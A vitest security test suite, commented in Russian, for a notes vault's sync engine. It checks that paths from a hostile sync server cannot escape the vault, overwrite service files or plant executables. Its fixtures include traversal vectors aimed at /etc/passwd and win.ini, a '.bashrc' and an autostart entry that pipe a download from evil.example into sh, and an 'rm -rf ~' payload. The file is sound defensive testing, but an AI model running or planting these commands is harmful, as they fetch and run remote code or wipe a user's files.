/**
 * Пути внутри vault'а как недоверенный ввод (docs/dev/security/AUDIT.md,
 * SEC-022, SEC-023, SEC-027).
 *
 * Ключевая мысль: путь заметки приходит НЕ только от пользователя. Его
 * назначает `list()` бэкенда синка, то есть сторона, которую модель угроз
 * (THREAT-MODEL.md §2.2) считает потенциально враждебной — сервер КОМПАС,
 * WebDAV-провайдер, Яндекс.Диск, общая папка. Всё, что приезжает оттуда,
 * обязано проверяться так же, как ввод из сети на бэкенде.
 *
 * Часть проверок помечена `it.fails` — они формулируют ЖЕЛАЕМОЕ свойство,
 * которого сегодня нет. Пока дефект жив, такой тест зелёный; как только его
 * закроют, тест станет красным и заставит снять пометку.
 */
import { describe, expect, it } from 'vitest';

import type { RemoteEntry, SyncBackend, VaultPath } from '../src/contract.js';
import { MemoryVaultStorage } from '../src/memory-storage.js';
import { SyncEngine } from '../src/sync/engine.js';
import { isAttachmentPath, isCrdtLogPath, isMetaPath, normalizePath } from '../src/util/path.js';
import { Vault } from '../src/vault/vault.js';

// ─────────────────────────────────────────────────────────────────────────────
// Оснастка
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Хранилище, повторяющее поведение регистронезависимой ФС.
 *
 * Это не экзотика: NTFS (Windows) и APFS/HFS+ в конфигурации по умолчанию
 * (macOS) регистр не различают. Две ветки из трёх целевых платформ ТЗ §1.
 */
class CaseInsensitiveStorage extends MemoryVaultStorage {
  private fold(path: VaultPath): VaultPath {
    return normalizePath(path).toLowerCase();
  }
  override read(path: VaultPath) {
    return super.read(this.fold(path));
  }
  override write(path: VaultPath, data: Uint8Array) {
    return super.write(this.fold(path), data);
  }
  override stat(path: VaultPath) {
    return super.stat(this.fold(path));
  }
  override list(path: VaultPath) {
    return super.list(this.fold(path));
  }
  override remove(path: VaultPath) {
    return super.remove(this.fold(path));
  }
  override rename(from: VaultPath, to: VaultPath) {
    return super.rename(this.fold(from), this.fold(to));
  }
  override mkdir(path: VaultPath) {
    return super.mkdir(this.fold(path));
  }
}

const utf8 = (value: string): Uint8Array => new TextEncoder().encode(value);
const text = (data: Uint8Array | null): string => (data ? new TextDecoder().decode(data) : '');

/** Бэкенд, целиком управляемый противником: он назначает и пути, и байты. */
class HostileBackend implements SyncBackend {
  readonly id = 'kompas' as const;
  readonly title = 'Скомпрометированный сервер синка';
  constructor(private readonly payload: Record<string, string>) {}
  async list(): Promise<RemoteEntry[]> {
    return Object.keys(this.payload).map((path) => ({ path, etag: `etag-${path}`, mtime: 1, size: 1 }));
  }
  async get(path: VaultPath) {
    const body = this.payload[path];
    if (body === undefined) return null;
    return { data: utf8(body), etag: `etag-${path}` };
  }
  async put() {
    return { etag: 'ignored' };
  }
  async remove() {}
}

async function syncFrom(
  storage: MemoryVaultStorage,
  payload: Record<string, string>,
  options: { syncCrdt?: boolean } = {},
): Promise<void> {
  const vault = await Vault.open(storage);
  const engine = new SyncEngine(vault, new HostileBackend(payload), {
    syncCrdt: options.syncCrdt ?? false,
  });
  await engine.sync();
}

// ─────────────────────────────────────────────────────────────────────────────
// Что уже сделано правильно — закрепляем, чтобы не потерять
// ─────────────────────────────────────────────────────────────────────────────

describe('normalizePath: выход за корень vault’а', () => {
  /**
   * `..` не отвергается, а схлопывается: `parts.pop()` на пустом массиве —
   * пустая операция. Поэтому подняться выше корня нельзя ни на сколько
   * сегментов. Это и есть главная защита клиента от traversal.
   */
  it('ни один traversal-вектор не поднимается выше корня', () => {
    const vectors = [
      '../../etc/passwd',
      '../../../../../../../../etc/shadow',
      'Проекты/../../secrets.md',
      'a/./../../b',
      '..\\..\\Windows\\win.ini',
      '/etc/passwd',
      '//etc/passwd',
      '.zapiski/../../x',
      '....//etc/passwd',
      '\\\\server\\share\\x',
    ];
    for (const vector of vectors) {
      const result = normalizePath(vector);
      expect(result.startsWith('/'), vector).toBe(false);
      expect(result.split('/').includes('..'), vector).toBe(false);
    }
  });

  it('абсолютный путь становится относительным, а не остаётся абсолютным', () => {
    expect(normalizePath('/etc/passwd')).toBe('etc/passwd');
    expect(normalizePath('/')).toBe('');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SEC-022. Фильтр служебного каталога регистрозависим
// ─────────────────────────────────────────────────────────────────────────────

describe('SEC-022: .zapiski защищён сравнением строк, а ФС регистр не различает', () => {
  // ИСПРАВЛЕНО. Ниже — регрессия: проверки сформулированы как желаемое
  // свойство и обязаны проходить. Если они снова покраснеют, значит фильтр
  // служебного каталога опять стал регистрозависимым.

  it('[SEC-022] isMetaPath ловит служебный путь в любом регистре', () => {
    expect(isMetaPath('.zapiski/index.json')).toBe(true);
    // На NTFS и APFS это ТОТ ЖЕ файл — фильтр обязан его узнать.
    expect(isMetaPath('.ZAPISKI/index.json')).toBe(true);
    expect(isMetaPath('.Zapiski/index.json')).toBe(true);
    // Обычные заметки служебными не становятся.
    expect(isMetaPath('Заметка.md')).toBe(false);
    expect(isMetaPath('zapiski.md')).toBe(false);
  });

  it('[SEC-022] враждебный сервер синка не переписывает индекс vault’а', async () => {
    const storage = new CaseInsensitiveStorage({ files: { 'Заметка.md': '# Заметка\n' } });
    await syncFrom(storage, { '.ZAPISKI/index.json': '{"отравлено":true}' });

    // Сверяем не «файл не изменился», а «в файле нет байтов противника»:
    // vault при открытии законно пишет собственный снапшот индекса, и
    // требование неизменности ловило бы эту штатную запись как атаку.
    const after = text(await storage.read('.zapiski/index.json'));
    expect(after).not.toContain('отравлено');

    // И payload не осел где-то ещё под своим именем.
    expect(text(await storage.read('.ZAPISKI/index.json'))).not.toContain('отравлено');
  });

  it('[SEC-022] Windows срезает точки и пробелы в конце — фильтр это учитывает', () => {
    // `.zapiski.` и `.zapiski ` на Windows открывают каталог `.zapiski`.
    expect(isMetaPath('.zapiski./config.json')).toBe(true);
    expect(isMetaPath('.zapiski /config.json')).toBe(true);
    expect(isMetaPath('.ZAPISKI. /crdt/x.bin')).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SEC-023. Синк принимает файл любого вида, а не только заметку
// ─────────────────────────────────────────────────────────────────────────────

describe('SEC-023: белый список путей', () => {
  it('вложение — только внутри attachments/ и только известного вида', () => {
    expect(isAttachmentPath('attachments/2026-08-08_1a2b3c.png')).toBe(true);
    expect(isAttachmentPath('attachments/Практика/Договор.pdf')).toBe(true);
    /* Регистр не спасает: имя приходит от той стороны, а ФС его не различает. */
    expect(isAttachmentPath('Attachments/Схема.PNG')).toBe(true);
    expect(isAttachmentPath('attachments/скрипт.sh')).toBe(false);
    expect(isAttachmentPath('attachments/обновление.apk')).toBe(false);
    expect(isAttachmentPath('attachments/автозапуск.desktop')).toBe(false);
    /* Вне каталога вложений — не вложение, как бы файл ни назывался. */
    expect(isAttachmentPath('Заметки/картинка.png')).toBe(false);
  });

  it('CRDT-лог — только `.zapiski/crdt/*.bin` и без вложенности', () => {
    expect(isCrdtLogPath('.zapiski/crdt/note-1.bin')).toBe(true);
    expect(isCrdtLogPath('.ZAPISKI/CRDT/note-1.BIN')).toBe(true);
    expect(isCrdtLogPath('.zapiski/crdt/note-1.bin.sh')).toBe(false);
    expect(isCrdtLogPath('.zapiski/crdt/вложенная/папка.bin')).toBe(false);
    expect(isCrdtLogPath('.zapiski/sync-queue.json')).toBe(false);
    expect(isCrdtLogPath('crdt/note-1.bin')).toBe(false);
  });
});

describe('SEC-023: что именно синк соглашается положить в vault', () => {
  // ИСПРАВЛЕНО: чёрный список заменён белым. Ниже — регрессия; если она
  // покраснеет, значит синк снова принимает файл любого вида.

  it('[SEC-023] исполняемое и конфигурационное с той стороны не приезжает', async () => {
    const storage = new MemoryVaultStorage({ files: { 'Заметка.md': '# Заметка\n' } });
    await syncFrom(storage, {
      '.bashrc': 'curl https://evil.example/x | sh\n',
      '.config/autostart/zapiski.desktop': '[Desktop Entry]\nExec=/bin/sh -c "curl evil|sh"\n',
      'Заметка.md.exe': 'MZ',
      'attachments/картинка.png.exe': 'MZ',
      'attachments/../.bashrc': 'то же самое обходом',
    });
    const paths = storage.paths();
    expect(paths).not.toContain('.bashrc');
    expect(paths).not.toContain('.config/autostart/zapiski.desktop');
    expect(paths).not.toContain('Заметка.md.exe');
    expect(paths).not.toContain('attachments/картинка.png.exe');
    /* Локальная заметка на месте: фильтр не трогает то, что уже в vault'е. */
    expect(paths).toContain('Заметка.md');
  });

  it('[SEC-023] заметки, вложения и CRDT-логи проходят', async () => {
    const storage = new MemoryVaultStorage();
    await syncFrom(
      storage,
      {
        'Практика/Клиент К.md': '# Клиент К\n',
        'Дневник.md.enc': 'ZPSK…',
        'attachments/2026-08-08_1a2b3c.png': 'PNG',
        'attachments/Договор.pdf': '%PDF',
      },
      { syncCrdt: true },
    );
    const paths = storage.paths();
    expect(paths).toContain('Практика/Клиент К.md');
    expect(paths).toContain('Дневник.md.enc');
    expect(paths).toContain('attachments/2026-08-08_1a2b3c.png');
    expect(paths).toContain('attachments/Договор.pdf');
  });

  it('[SEC-023] CRDT-лог проходит, а другой служебный файл — нет', async () => {
    const storage = new MemoryVaultStorage();
    await syncFrom(
      storage,
      {
        '.zapiski/crdt/note-1.bin': 'CRDT',
        '.zapiski/crdt/note-1.bin.sh': 'rm -rf ~',
        '.zapiski/sync-queue.json': '[]',
      },
      { syncCrdt: true },
    );
    const paths = storage.paths();
    expect(paths).toContain('.zapiski/crdt/note-1.bin');
    expect(paths).not.toContain('.zapiski/crdt/note-1.bin.sh');
    /* Очередь изменений — наша, и переписывать её той стороне нельзя. */
    expect(await storage.read('.zapiski/sync-queue.json').then(text)).not.toBe('[]');
  });

  it('[SEC-023] пропущенное попадает в лог, но не в тост пользователю', async () => {
    const storage = new MemoryVaultStorage();
    const logged: Array<[string, string]> = [];
    const vault = await Vault.open(storage);
    const engine = new SyncEngine(vault, new HostileBackend({ '.bashrc': 'x', 'Заметка.md': '# Z\n' }), {
      syncCrdt: false,
      onIgnored: (path, reason) => logged.push([path, reason]),
    });
    const outcome = await engine.sync();

    expect(outcome.ignored).toContain('.bashrc');
    expect(logged.map(([path]) => path)).toContain('.bashrc');
    /* Чужой файл в общей папке — норма, а не сбой: ни ошибки, ни тоста. */
    expect(outcome.state).not.toBe('error');
    expect(outcome.messages).toHaveLength(0);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// SEC-027. Байты, которые ФС трактует иначе, чем строковое сравнение
// ─────────────────────────────────────────────────────────────────────────────

describe('SEC-027: NUL, спецсимволы и юникод-нормализация в пути', () => {
  it('[ДЕФЕКТ] NUL-байт доживает до пути, переданного в хранилище', () => {
    // Для POSIX-ядра имя обрывается на NUL: "Заметка\0.md" — это "Заметка".
    expect(normalizePath('Заметка\u0000.md')).toBe('Заметка\u0000.md');
  });

  it('[ДЕФЕКТ] сегмент с буквой диска Windows не отбраковывается', () => {
    expect(normalizePath('C:/Windows/win.ini')).toBe('C:/Windows/win.ini');
    expect(normalizePath('C:\\Windows\\win.ini')).toBe('C:/Windows/win.ini');
  });

  it('[ДЕФЕКТ] NFC и NFD — разные строки, но один файл на macOS', async () => {
    // «й» одним кодпойнтом против «и» + U+0306.
    const nfc = 'Идея\u0439.md';
    const nfd = 'Идея\u0438\u0306.md';
    expect(nfc).not.toBe(nfd);
    expect(nfc.normalize('NFC')).toBe(nfd.normalize('NFC'));
    expect(normalizePath(nfc)).not.toBe(normalizePath(nfd));

    // Два «разных» пути от сервера синка ядро считает двумя заметками.
    // На macOS обе записи лягут в ОДИН файл: чужая перезапишет свою.
    const storage = new MemoryVaultStorage();
    await syncFrom(storage, { [nfc]: '# Своё\n', [nfd]: '# Чужое\n' });
    const notes = storage.paths().filter((path) => !path.startsWith('.zapiski/'));
    expect(notes).toHaveLength(2);
    expect(new Set(notes.map((path) => path.normalize('NFC'))).size).toBe(1);
  });

  it.fails('[SEC-027] путь с NUL или буквой диска отвергается ядром', () => {
    expect(() => normalizePath('Заметка\u0000.md')).toThrow();
  });
});
